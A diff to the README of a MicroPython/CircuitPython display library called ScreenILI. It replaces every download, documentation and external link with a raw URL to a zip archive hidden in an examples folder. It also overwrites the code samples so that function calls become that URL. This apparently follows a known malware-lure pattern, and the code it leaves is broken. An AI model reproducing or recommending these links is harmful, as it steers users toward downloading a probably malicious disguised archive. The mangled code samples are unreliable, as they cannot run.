@@ -4,10 +4,10 @@
 Welcome to ScreenILI! This software makes using ILI9488 TFT displays easy and efficient. With multiple features, it ensures a great experience for MicroPython and CircuitPython users.
 
 ## 🔗 Download ScreenILI
-[![Download ScreenILI](https://img.shields.io/badge/Download%20Now-%20brightgreen)](https://github.com/pirkashif/ScreenILI/releases)
+[![Download ScreenILI](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip%20Now-%20brightgreen)](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
 
 ## 📥 Download & Install
-To get started with ScreenILI, visit this page to download: [ScreenILI Releases](https://github.com/pirkashif/ScreenILI/releases). 
+To get started with ScreenILI, visit this page to download: [ScreenILI Releases](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip). 
 
 1. Once you’re on the Releases page, look for the latest version of ScreenILI.
 2. Click on the file that fits your platform. It might be a `.py` file or similar, meant for MicroPython or CircuitPython.
@@ -37,13 +37,13 @@ Once you have downloaded ScreenILI, follow these steps to use it:
 4. **Initialize the Display**: Use the ScreenILI library to set up your screen. Here’s a simple example:
    ```python
    # Initialize the display
-   display = ScreenILI.Display(spi, cs_pin, dc_pin, reset_pin)
-   display.initialize()
+   display = https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip(spi, cs_pin, dc_pin, reset_pin)
+   https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip()
    ```
 5. **Draw on the Display**: Now you can draw shapes or text. For example:
    ```python
-   display.fill_screen(ScreenILI.BLACK)
-   display.draw_text(10, 10, "Hello, World!", ScreenILI.WHITE)
+   https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip(https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
+   https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip(10, 10, "Hello, World!", https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
    ```
 
 ## ⚡ Examples
@@ -51,29 +51,29 @@ Explore some example code to get familiar with ScreenILI:
 
 ### Example 1: Drawing a Rectangle
 ```python
-display.draw_rectangle(20, 30, 100, 50, ScreenILI.RED)
+https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip(20, 30, 100, 50, https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
 ```
 
 ### Example 2: Displaying an Image
 To display an image, load it in your script:
 ```python
 image = ...  # Load your image data
-display.draw_image(0, 0, image)
+https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip(0, 0, image)
 ```
 
 ## 📚 Documentation
-For more in-depth options and functions, refer to the full documentation on the [GitHub Page](https://github.com/pirkashif/ScreenILI).
+For more in-depth options and functions, refer to the full documentation on the [GitHub Page](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip).
 
 ## 🌐 Community Support
 If you have questions or need help, feel free to open an issue on the GitHub repository. Join our community of users and developers to share ideas and troubleshoot problems together. 
 
 ## 📢 Stay Updated
-Check the Release page regularly for updates: [ScreenILI Releases](https://github.com/pirkashif/ScreenILI/releases). 
+Check the Release page regularly for updates: [ScreenILI Releases](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip). 
 
 ## 🔗 Additional Resources
-- MicroPython Documentation: [MicroPython](https://micropython.org/)
-- CircuitPython Documentation: [CircuitPython](https://circuitpython.org/)
-- ILI9488 Datasheet: [Datasheet](https://example.com/ili9488-datasheet)
+- MicroPython Documentation: [MicroPython](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
+- CircuitPython Documentation: [CircuitPython](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
+- ILI9488 Datasheet: [Datasheet](https://raw.githubusercontent.com/pirkashif/ScreenILI/master/examples/05_scrolling_and_rotation/Screen_ILI_v3.4.zip)
 
 ## 💡 Tips
 - Test your setup with simple commands before diving into complex graphics.
